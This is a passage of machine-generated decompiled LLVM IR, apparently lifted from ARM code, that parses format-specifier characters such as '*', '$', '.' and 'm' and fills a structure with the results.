  %v0_10d3c = phi i32 [ %v5_10cbc, %dec_label_pc_10cf8 ], [ %v0_10c34, %bb133 ], [ %v0_10c34, %dec_label_pc_10c8c ], [ %v0_10c34, %dec_label_pc_10c34 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_10cf8 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_10c8c ], [ %stack_var_-48.1, %dec_label_pc_10c34 ]
  %v1_10cfc = inttoptr i32 %v0_10d3c to i8*
  %v2_10cfc = load i8, i8* %v1_10cfc, align 1
  %v3_10cfc = zext i8 %v2_10cfc to i32
  store i32 %v3_10cfc, i32* %r3.global-to-local, align 4
  %v7_10d00 = icmp eq i8 %v2_10cfc, 42
  br i1 %v7_10d00, label %dec_label_pc_10d08, label %dec_label_pc_10d4c

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10cfc
  %v0_10d08 = load i32, i32* %sb.global-to-local, align 4
  %v2_10d08 = icmp eq i32 %v0_10d08, 0
  br i1 %v2_10d08, label %dec_label_pc_10d3c, label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10d08
  %v1_10d10 = inttoptr i32 %v1_10d40 to i8*
  %v2_10d10 = load i8, i8* %v1_10d10, align 1
  %v3_10d10 = zext i8 %v2_10d10 to i32
  store i32 %v3_10d10, i32* %r3.global-to-local, align 4
  %v7_10d14 = icmp eq i8 %v2_10d10, 36
  br i1 %v7_10d14, label %dec_label_pc_10d1c, label %dec_label_pc_10fc4

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10d10
  %v0_10d1c = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_10d1c, 1
  br i1 %tmp134, label %dec_label_pc_10fc4, label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d1c
  store i32 %v25_10b30, i32* %r1.global-to-local, align 4
  %v0_10d2c = load i32, i32* @lr, align 4
  %v3_10d2c = mul i32 %v0_10d2c, -4
  %v4_10d2c = add i32 %v3_10d2c, %v25_10b30
  store i32 %v4_10d2c, i32* %r3.global-to-local, align 4
  %v1_10d30 = add i32 %v1_10d40, 1
  store i32 %v1_10d30, i32* %r6.global-to-local, align 4
  %v2_10d34 = add i32 %v4_10d2c, -24
  %v3_10d34 = inttoptr i32 %v2_10d34 to i32*
  store i32 %v0_10d1c, i32* %v3_10d34, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d08
  %v1_10d3c = add i32 %v0_10d3c, 1
  store i32 %v1_10d3c, i32* %r3.global-to-local, align 4
  %v9_10d40 = icmp eq i32 %v1_10d3c, %v1_10d40
  br i1 %v9_10d40, label %dec_label_pc_10d48, label %dec_label_pc_10fc4

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10d24
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10cfc, %dec_label_pc_10d48
  %v0_10d4c = load i32, i32* @lr, align 4
  %v2_10d4c = icmp eq i32 %v0_10d4c, 0
  br i1 %v2_10d4c, label %dec_label_pc_10d54, label %dec_label_pc_10b6c

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d4c
  %v0_10d54 = load i32, i32* %r6.global-to-local, align 4
  %v1_10d54 = inttoptr i32 %v0_10d54 to i8*
  %v2_10d54 = load i8, i8* %v1_10d54, align 1
  %v3_10d54 = zext i8 %v2_10d54 to i32
  store i32 %v3_10d54, i32* %r3.global-to-local, align 4
  %v7_10d58 = icmp eq i8 %v2_10d54, 46
  br i1 %v7_10d58, label %.thread22, label %dec_label_pc_10d6c

.thread22:                                        ; preds = %dec_label_pc_10d54
  %v2_10d5c = add i32 %v0_10d54, 1
  store i32 %v2_10d5c, i32* %r6.global-to-local, align 4
  %v1_10d60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_10d60, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_10bd4

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d54
  %v0_10d6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d6c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10b6c, %dec_label_pc_10d6c
  %v0_10d7c.pre = phi i32 [ %v0_10d54, %dec_label_pc_10d6c ], [ %v0_10d7c.pre.pre, %dec_label_pc_10b6c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_10d6c ], [ %v0_10b6c, %dec_label_pc_10b6c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19318.365 to i32), i32* %r1.global-to-local, align 4
  %v1_10d7c = inttoptr i32 %v0_10d7c.pre to i8*
  br label %dec_label_pc_10d78

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d88, %dec_label_pc_10d74
  %v0_10d88 = phi i32 [ %v1_10d88, %dec_label_pc_10d88 ], [ ptrtoint ([9 x i8]* @global_var_19318.365 to i32), %dec_label_pc_10d74 ]
  %v1_10d78 = inttoptr i32 %v0_10d88 to i8*
  %v2_10d78 = load i8, i8* %v1_10d78, align 1
  %v3_10d78 = zext i8 %v2_10d78 to i32
  store i32 %v3_10d78, i32* %r2.global-to-local, align 4
  %v2_10d7c = load i8, i8* %v1_10d7c, align 1
  %v3_10d7c = zext i8 %v2_10d7c to i32
  store i32 %v3_10d7c, i32* %r3.global-to-local, align 4
  %v9_10d80 = icmp eq i8 %v2_10d7c, %v2_10d78
  br i1 %v9_10d80, label %dec_label_pc_10b74, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d78
  %v1_10d88 = add i32 %v0_10d88, 1
  %v2_10d88 = inttoptr i32 %v1_10d88 to i8*
  %v3_10d88 = load i8, i8* %v2_10d88, align 1
  %v4_10d88 = zext i8 %v3_10d88 to i32
  store i32 %v4_10d88, i32* %r3.global-to-local, align 4
  store i32 %v1_10d88, i32* %r1.global-to-local, align 4
  %v2_10d8c = icmp eq i8 %v3_10d88, 0
  br i1 %v2_10d8c, label %dec_label_pc_10d94, label %dec_label_pc_10d78

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d88, %dec_label_pc_10b74
  %v1_10db4 = phi i32 [ %v1_10b74, %dec_label_pc_10b74 ], [ %v0_10d7c.pre, %dec_label_pc_10d88 ]
  %v1_10db0 = phi i32 [ %v0_10d88, %dec_label_pc_10b74 ], [ %v1_10d88, %dec_label_pc_10d88 ]
  %v2_10d98 = sub i32 %v1_10db0, ptrtoint ([9 x i8]* @global_var_19318.365 to i32)
  store i32 %v2_10d98, i32* %r3.global-to-local, align 4
  %v8_10da0 = icmp sgt i32 %v2_10d98, 1
  br i1 %v8_10da0, label %.thread25, label %dec_label_pc_10da4

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10d94
  %v1_10da4 = inttoptr i32 %v1_10db4 to i8*
  %v2_10da4 = load i8, i8* %v1_10da4, align 1
  %v3_10da4 = zext i8 %v2_10da4 to i32
  store i32 %v3_10da4, i32* %r2.global-to-local, align 4
  %v1_10da8 = inttoptr i32 %v1_10db0 to i8*
  %v2_10da8 = load i8, i8* %v1_10da8, align 1
  %v3_10da8 = zext i8 %v2_10da8 to i32
  store i32 %v3_10da8, i32* %r3.global-to-local, align 4
  %v9_10dac = icmp eq i8 %v2_10da4, %v2_10da8
  br i1 %v9_10dac, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_10da4
  %v2_10db0 = add i32 %v1_10db0, 9
  store i32 %v2_10db0, i32* %r1.global-to-local, align 4
  %v2_10db4 = add i32 %v1_10db4, 1
  store i32 %v2_10db4, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10da4, %dec_label_pc_10d94, %bb135
  %v0_10dbc = phi i32 [ %v1_10db0, %dec_label_pc_10da4 ], [ %v1_10db0, %dec_label_pc_10d94 ], [ %v2_10db0, %bb135 ]
  %v0_10db8 = phi i32 [ %v1_10db4, %dec_label_pc_10da4 ], [ %v1_10db4, %dec_label_pc_10d94 ], [ %v2_10db4, %bb135 ]
  %v1_10db8 = inttoptr i32 %v0_10db8 to i8*
  %v2_10db8 = load i8, i8* %v1_10db8, align 1
  %v3_10db8 = zext i8 %v2_10db8 to i32
  store i32 %v3_10db8, i32* %r2.global-to-local, align 4
  %v1_10dbc = add i32 %v0_10dbc, 9
  %v2_10dbc = inttoptr i32 %v1_10dbc to i8*
  %v3_10dbc = load i8, i8* %v2_10dbc, align 1
  %v4_10dbc = zext i8 %v3_10dbc to i32
  store i32 %v4_10dbc, i32* %r3.global-to-local, align 4
  %v2_10dc0 = icmp eq i8 %v2_10db8, 0
  %v3_10dc4 = mul nuw nsw i32 %v4_10dbc, 256
  store i32 %v3_10dc4, i32* @lr, align 4
  br i1 %v2_10dc0, label %dec_label_pc_10fc4, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %.thread25
  %v3_10dd0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_10dd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10e58, %dec_label_pc_10dcc
  %v1_10de4 = phi i32 [ %v1_10e58, %dec_label_pc_10e58 ], [ ptrtoint ([21 x i8]* @global_var_19358.367 to i32), %dec_label_pc_10dcc ]
  %v1_10dd4 = inttoptr i32 %v1_10de4 to i8*
  %v2_10dd4 = load i8, i8* %v1_10dd4, align 1
  %v3_10dd4 = zext i8 %v2_10dd4 to i32
  store i32 %v3_10dd4, i32* %r3.global-to-local, align 4
  %v9_10dd8 = icmp eq i8 %v2_10dd4, %v2_10db8
  br i1 %v9_10dd8, label %dec_label_pc_10de0, label %dec_label_pc_10e58

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dd4
  store i32 ptrtoint ([21 x i8]* @global_var_19358.367 to i32), i32* %r3.global-to-local, align 4
  %v2_10de4 = sub i32 %v1_10de4, ptrtoint ([21 x i8]* @global_var_19358.367 to i32)
  store i32 %v2_10de4, i32* %r2.global-to-local, align 4
  %v7_10dec = icmp slt i32 %v2_10de4, 18
  br i1 %v7_10dec, label %bb137, label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10de0
  %v1_10df0 = and i32 %v3_10dc4, 1024
  %v2_10df0 = icmp eq i32 %v1_10df0, 0
  br i1 %v2_10df0, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_10df0
  %v2_10df4 = add i32 %v2_10de4, -2
  store i32 %v2_10df4, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_10de0, %dec_label_pc_10df0, %bb136
  %v0_10df8 = phi i32 [ %v2_10de4, %dec_label_pc_10de0 ], [ %v2_10de4, %dec_label_pc_10df0 ], [ %v2_10df4, %bb136 ]
  %v1_10df8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10df8 = add i32 %v1_10df8, 32
  %v3_10df8 = inttoptr i32 %v2_10df8 to i32*
  store i32 %v0_10df8, i32* %v3_10df8, align 4
  store i32 ptrtoint (i32* @global_var_1934b.369 to i32), i32* %r1.global-to-local, align 4
  %v0_10e04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10e00, %bb137
  %v0_10e00 = phi i32 [ %v1_10e00, %dec_label_pc_10e00 ], [ ptrtoint (i32* @global_var_1934b.369 to i32), %bb137 ]
  %v1_10e00 = add i32 %v0_10e00, 1
  %v2_10e00 = inttoptr i32 %v1_10e00 to i8*
  %v3_10e00 = load i8, i8* %v2_10e00, align 1
  %v4_10e00 = zext i8 %v3_10e00 to i32
  store i32 %v4_10e00, i32* %r3.global-to-local, align 4
  store i32 %v1_10e00, i32* %r1.global-to-local, align 4
  %v8_10e08 = icmp sgt i32 %v0_10e04.pre, %v4_10e00
  br i1 %v8_10e08, label %dec_label_pc_10e00, label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10e00
  store i32 ptrtoint (i32* @global_var_1933c.373 to i32), i32* %r0.global-to-local, align 4
  %v2_10e14 = sub i32 %v1_10e00, ptrtoint (i32* @global_var_1934c.371 to i32)
  %v2_10e18 = mul i32 %v2_10e14, 2
  store i32 %v2_10e18, i32* %r3.global-to-local, align 4
  %v2_10e20 = add i32 %v2_10e18, ptrtoint (i32* @global_var_1933c.373 to i32)
  store i32 %v2_10e20, i32* %r2.global-to-local, align 4
  %v1_10e24 = add i32 %v2_10e18, add (i32 ptrtoint (i32* @global_var_1933c.373 to i32), i32 1)
  %v2_10e24 = inttoptr i32 %v1_10e24 to i8*
  %v3_10e24 = load i8, i8* %v2_10e24, align 1
  %v4_10e24 = zext i8 %v3_10e24 to i32
  store i32 %v4_10e24, i32* %r1.global-to-local, align 4
  %v2_10e28 = add i32 %v2_10e18, ptrtoint (i32* @global_var_1932c.375 to i32)
  store i32 %v2_10e28, i32* %r2.global-to-local, align 4
  %v3_10e2c = inttoptr i32 %v2_10e20 to i8*
  %v4_10e2c = load i8, i8* %v3_10e2c, align 2
  %v6_10e2c = zext i8 %v4_10e2c to i32
  store i32 %v6_10e2c, i32* %r0.global-to-local, align 4
  %v1_10e30 = add i32 %v2_10e18, add (i32 ptrtoint (i32* @global_var_1932c.375 to i32), i32 1)
  %v2_10e30 = inttoptr i32 %v1_10e30 to i8*
  %v3_10e30 = load i8, i8* %v2_10e30, align 1
  %v4_10e30 = zext i8 %v3_10e30 to i32
  store i32 %v4_10e30, i32* %r2.global-to-local, align 4
  %v3_10e34 = inttoptr i32 %v2_10e28 to i8*
  %v4_10e34 = load i8, i8* %v3_10e34, align 2
  %v6_10e34 = zext i8 %v4_10e34 to i32
  %v3_10e38 = mul nuw i32 %v4_10e24, 16777216
  store i32 %v3_10e38, i32* %r1.global-to-local, align 4
  %v4_10e3c = sdiv i32 %v3_10e38, 65536
  %v5_10e3c = or i32 %v6_10e2c, %v4_10e3c
  %v3_10e40 = mul nuw i32 %v4_10e30, 16777216
  store i32 %v3_10e40, i32* %r2.global-to-local, align 4
  %v4_10e44 = sdiv i32 %v3_10e40, 65536
  %v5_10e44 = or i32 %v6_10e34, %v4_10e44
  store i32 %v5_10e44, i32* %r3.global-to-local, align 4
  %v0_10e48 = load i32, i32* @lr, align 4
  %v2_10e48 = or i32 %v5_10e3c, %v0_10e48
  store i32 ptrtoint ([21 x i8]* @global_var_19358.367 to i32), i32* @ip, align 4
  %v2_10e50 = and i32 %v2_10e48, %v5_10e44
  store i32 %v2_10e50, i32* %r0.global-to-local, align 4
  %v0_10e6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e64

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10dd4
  %v1_10e58 = add i32 %v1_10de4, 1
  %v2_10e58 = inttoptr i32 %v1_10e58 to i8*
  %v3_10e58 = load i8, i8* %v2_10e58, align 1
  %v4_10e58 = zext i8 %v3_10e58 to i32
  store i32 %v4_10e58, i32* %r3.global-to-local, align 4
  store i32 %v1_10e58, i32* @ip, align 4
  %v2_10e5c = icmp eq i8 %v3_10e58, 0
  br i1 %v2_10e5c, label %dec_label_pc_10e64, label %dec_label_pc_10dd4

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e58, %dec_label_pc_10e0c
  %v0_10e70 = phi i32 [ %v0_10e48, %dec_label_pc_10e0c ], [ %v3_10dc4, %dec_label_pc_10e58 ]
  %v0_10e6c = phi i32 [ %v0_10e6c.pre, %dec_label_pc_10e0c ], [ %v0_10db8, %dec_label_pc_10e58 ]
  %v0_10e64 = phi i32 [ %v2_10e50, %dec_label_pc_10e0c ], [ %v3_10dd0, %dec_label_pc_10e58 ]
  store i32 %v0_10e64, i32* %stack_var_-36, align 4
  %v0_10e68 = load i32, i32* @r4, align 4
  %v1_10e68 = and i32 %v0_10e68, 4
  %v1_10e6c = inttoptr i32 %v0_10e6c to i8*
  %v2_10e6c = load i8, i8* %v1_10e6c, align 1
  %v3_10e6c = zext i8 %v2_10e6c to i32
  store i32 %v3_10e6c, i32* %r1.global-to-local, align 4
  %v1_10e70 = and i32 %v0_10e70, 3840
  %v1_10e74 = and i32 %v0_10e68, -5
  %v2_10e78 = or i32 %v1_10e74, %v1_10e70
  store i32 %v2_10e78, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_10e68, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_10e88 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e88 = add i32 %v1_10e88, 12
  %v3_10e88 = inttoptr i32 %v2_10e88 to i32*
  store i32 %v3_10e6c, i32* %v3_10e88, align 4
  %v0_10e8c = load i32, i32* %r7.global-to-local, align 4
  %v1_10e8c = add i32 %v0_10e8c, 4
  %v2_10e8c = inttoptr i32 %v1_10e8c to i32*
  %v3_10e8c = load i32, i32* @r5, align 4
  store i32 %v3_10e8c, i32* %v2_10e8c, align 4
  %v4_10e8c = add i32 %v0_10e8c, 8
  %v5_10e8c = inttoptr i32 %v4_10e8c to i32*
  %v6_10e8c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_10e8c, i32* %v5_10e8c, align 4
  %v0_10e90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e90 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e90 = add i32 %v1_10e90, 20
  %v3_10e90 = inttoptr i32 %v2_10e90 to i32*
  store i32 %v0_10e90, i32* %v3_10e90, align 4
  %v0_10e94 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e94 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e94 = add i32 %v1_10e94, 16
  %v3_10e94 = inttoptr i32 %v2_10e94 to i32*
  store i32 %v0_10e94, i32* %v3_10e94, align 4
  %v0_10e98 = load i32, i32* %r0.global-to-local, align 4
  %v1_10e98 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e98 = add i32 %v1_10e98, 28
  %v3_10e98 = inttoptr i32 %v2_10e98 to i32*
  store i32 %v0_10e98, i32* %v3_10e98, align 4
  %v0_10e9c = load i32, i32* @ip, align 4
  %v1_10e9c = inttoptr i32 %v0_10e9c to i8*
  %v2_10e9c = load i8, i8* %v1_10e9c, align 1
  %v3_10e9c = zext i8 %v2_10e9c to i32
  store i32 %v3_10e9c, i32* %r2.global-to-local, align 4
  %v2_10ea0 = icmp eq i8 %v2_10e9c, 0
  br i1 %v2_10ea0, label %dec_label_pc_10ea8, label %dec_label_pc_10ec0

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e64
  %v0_10ea8 = load i32, i32* %r6.global-to-local, align 4
  %v1_10ea8 = inttoptr i32 %v0_10ea8 to i8*
  %v2_10ea8 = load i8, i8* %v1_10ea8, align 1
  %v3_10ea8 = zext i8 %v2_10ea8 to i32
  store i32 %v3_10ea8, i32* %r3.global-to-local, align 4
  %v7_10eac = icmp eq i8 %v2_10ea8, 109
  br i1 %v7_10eac, label %dec_label_pc_10eb4, label %dec_label_pc_10fc4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ea8
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_10eb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10eb8 = add i32 %v1_10eb8, 32
  %v3_10eb8 = inttoptr i32 %v2_10eb8 to i32*
  store i32 20, i32* %v3_10eb8, align 4
  %v0_10ebc = load i32, i32* %r2.global-to-local, align 4
  %v1_10ebc = load i32, i32* %r7.global-to-local, align 4
  %v2_10ebc = add i32 %v1_10ebc, 28
  %v3_10ebc = inttoptr i32 %v2_10ebc to i32*
  store i32 %v0_10ebc, i32* %v3_10ebc, align 4
  br label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_10eb4
  %v0_10ec0 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_10ec0, 1
  br i1 %tmp141, label %dec_label_pc_10f78, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ec0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10ec8
  %v8_10ee8 = phi i32 [ 0, %dec_label_pc_10ec8 ], [ %v1_10f64, %dec_label_pc_10f60 ]
  %v7_10ed0 = icmp sgt i32 %v8_10ee8, 2
  br i1 %v7_10ed0, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_10ecc
  store i32 %v25_10b30, i32* %r2.global-to-local, align 4
  %v12_10ed4 = mul i32 %v8_10ee8, 4
  %v13_10ed4 = add i32 %v12_10ed4, %v25_10b30
  store i32 %v13_10ed4, i32* %r3.global-to-local, align 4
  %v9_10ed8 = add i32 %v13_10ed4, -24
  %v10_10ed8 = inttoptr i32 %v9_10ed8 to i32*
  %v11_10ed8 = load i32, i32* %v10_10ed8, align 4
  store i32 %v11_10ed8, i32* %r2.global-to-local, align 4
  %v9_10edc = load i32, i32* %r7.global-to-local, align 4
  %v10_10edc = add i32 %v9_10edc, %v8_10ee8
  store i32 %v10_10edc, i32* %r3.global-to-local, align 4
  %v9_10ee4 = trunc i32 %v11_10ed8 to i8
  %v11_10ee4 = add i32 %v10_10edc, 36
  %v12_10ee4 = inttoptr i32 %v11_10ee4 to i8*
  store i8 %v9_10ee4, i8* %v12_10ee4, align 1
  %v8_10eec = load i32, i32* %r3.global-to-local, align 4
  %v9_10eec = add i32 %v8_10eec, 36
  %v10_10eec = inttoptr i32 %v9_10eec to i8*
  %v11_10eec = load i8, i8* %v10_10eec, align 1
  %v12_10eec = zext i8 %v11_10eec to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_10ecc
  %v10_10ee8 = add i32 %v8_10ee8, %stack_var_-48.3
  store i32 %v10_10ee8, i32* %r3.global-to-local, align 4
  %v9_10ef0 = add i32 %v10_10ee8, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_10f14 = phi i32 [ %v12_10eec, %bb142 ], [ %v9_10ef0, %bb143 ]
  store i32 %v0_10f14, i32* @r2, align 4
  %v1_10ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_10ef4 = sub i32 %v0_10f14, %v1_10ef4
  %v4_10ef4 = xor i32 %v1_10ef4, %v0_10f14
  %v5_10ef4 = xor i32 %v2_10ef4, %v0_10f14
  %v6_10ef4 = and i32 %v5_10ef4, %v4_10ef4
  %v7_10ef4 = icmp slt i32 %v6_10ef4, 0
  %v8_10ef4 = icmp slt i32 %v2_10ef4, 0
  %v9_10ef4 = icmp eq i32 %v0_10f14, %v1_10ef4
  %v3_10ef8 = xor i1 %v8_10ef4, %v7_10ef4
  %v4_10ef8 = or i1 %v9_10ef4, %v3_10ef8
  br i1 %v4_10ef8, label %dec_label_pc_10f08, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %bb144
  %v1_10efc = add i32 %v0_10f14, -9
  %v3_10efc = sub i32 8, %v0_10f14
  %v4_10efc = and i32 %v3_10efc, %v0_10f14
  %v5_10efc = icmp slt i32 %v4_10efc, 0
  %v6_10efc = icmp slt i32 %v1_10efc, 0
  %v7_10efc = icmp eq i32 %v0_10f14, 9
  %v3_10f00 = xor i1 %v6_10efc, %v5_10efc
  %v4_10f00 = or i1 %v7_10efc, %v3_10f00
  br i1 %v4_10f00, label %dec_label_pc_10f04, label %dec_label_pc_10fc4

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10efc
  store i32 %v0_10f14, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %bb144, %dec_label_pc_10f04
  store i32 %v25_10b30, i32* @ip, align 4
  %v1_10f0c = load i32, i32* %r8.global-to-local, align 4
  %v4_10f0c = mul i32 %v1_10f0c, 4
  %v5_10f0c = add i32 %v4_10f0c, %v25_10b30
  store i32 %v5_10f0c, i32* %r3.global-to-local, align 4
  %v1_10f10 = add i32 %v5_10f0c, -12
  %v2_10f10 = inttoptr i32 %v1_10f10 to i32*
  %v3_10f10 = load i32, i32* %v2_10f10, align 4
  store i32 %v3_10f10, i32* %r5.global-to-local, align 4
  %v1_10f14 = add i32 %v0_10f14, -1
  store i32 %v1_10f14, i32* %sl.global-to-local, align 4
  %v0_10f18 = load i32, i32* %r7.global-to-local, align 4
  %v4_10f18 = mul i32 %v1_10f14, 4
  %v5_10f18 = add i32 %v0_10f18, %v4_10f18
  store i32 %v5_10f18, i32* %r3.global-to-local, align 4
  %v7_10f1c = icmp eq i32 %v3_10f10, 8
  %v1_10f20 = add i32 %v5_10f18, 40
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  store i32 %v3_10f20, i32* @r0, align 4
  br i1 %v7_10f1c, label %dec_label_pc_10f60, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f08
  %v9_10f28 = icmp eq i32 %v3_10f20, %v3_10f10
  br i1 %v9_10f28, label %dec_label_pc_10f4c, label %bb145

bb145:                                            ; preds = %dec_label_pc_10f28
  %v8_10f2c = icmp eq i32 %v3_10f20, 8
  br i1 %v8_10f2c, label %dec_label_pc_10f4c, label %dec_label_pc_10f34

dec_label_pc_10f34:                               ; preds = %bb145
  %v0_10f34 = call i32 @_promoted_size()
  %v0_10f3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10f3c, i32* @r0, align 4
  %v0_10f40 = call i32 @_promoted_size()
  store i32 %v0_10f40, i32* %r0.global-to-local, align 4
  %v8_10f48 = icmp sgt i32 %v0_10f34, %v0_10f40
  br i1 %v8_10f48, label %dec_label_pc_10f60, label %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge

dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge:  ; preds = %dec_label_pc_10f34
  %v1_10f50.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10f58.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_10f58.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10f4c

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge, %dec_label_pc_10f28, %bb145
  %v1_10f58 = phi i32 [ %v1_10f58.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v1_10f14, %dec_label_pc_10f28 ], [ %v1_10f14, %bb145 ]
  %v0_10f58 = phi i32 [ %v0_10f58.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v0_10f18, %dec_label_pc_10f28 ], [ %v0_10f18, %bb145 ]
  %v1_10f50 = phi i32 [ %v1_10f50.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v1_10f0c, %dec_label_pc_10f28 ], [ %v1_10f0c, %bb145 ]
  store i32 %v25_10b30, i32* %r1.global-to-local, align 4
  %v4_10f50 = mul i32 %v1_10f50, 4
  %v5_10f50 = add i32 %v4_10f50, %v25_10b30
  store i32 %v5_10f50, i32* %r3.global-to-local, align 4
  %v1_10f54 = add i32 %v5_10f50, -12
  %v2_10f54 = inttoptr i32 %v1_10f54 to i32*
  %v3_10f54 = load i32, i32* %v2_10f54, align 4
  store i32 %v3_10f54, i32* @r2, align 4
  %v4_10f58 = mul i32 %v1_10f58, 4
  %v5_10f58 = add i32 %v4_10f58, %v0_10f58
  store i32 %v5_10f58, i32* %r3.global-to-local, align 4
  %v2_10f5c = add i32 %v5_10f58, 40
  %v3_10f5c = inttoptr i32 %v2_10f5c to i32*
  store i32 %v3_10f54, i32* %v3_10f5c, align 4
  br label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f34, %dec_label_pc_10f08, %dec_label_pc_10f4c
  %v0_10f60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f60 = add i32 %v0_10f60, 28
  %v2_10f60 = inttoptr i32 %v1_10f60 to i32*
  %v3_10f60 = load i32, i32* %v2_10f60, align 4
  %v0_10f64 = load i32, i32* %r8.global-to-local, align 4
  %v1_10f64 = add i32 %v0_10f64, 1
  store i32 %v1_10f64, i32* %r8.global-to-local, align 4
  %v1_10f68 = add i32 %v3_10f60, 2
  store i32 %v1_10f68, i32* %r3.global-to-local, align 4
  %v6_10f70 = icmp slt i32 %v1_10f64, %v1_10f68
  br i1 %v6_10f70, label %dec_label_pc_10ecc, label %dec_label_pc_10f90

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10ec0
  %v0_10f78 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f78 = add i32 %v0_10f78, 28
  %v2_10f78 = inttoptr i32 %v1_10f78 to i32*
  %v3_10f78 = load i32, i32* %v2_10f78, align 4
  store i32 %v3_10f78, i32* %r2.global-to-local, align 4
  %v0_10f7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10f7c = trunc i32 %v0_10f7c to i8
  %v3_10f7c = add i32 %v0_10f78, 38
  %v4_10f7c = inttoptr i32 %v3_10f7c to i8*
  store i8 %v1_10f7c, i8* %v4_10f7c, align 1
  %v0_10f80 = load i32, i32* %r2.global-to-local, align 4
  %v3_10f80 = mul i32 %v0_10f80, 4
  store i32 %v3_10f80, i32* @r2, align 4
  %v0_10f84 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f84 = add i32 %v0_10f84, 40
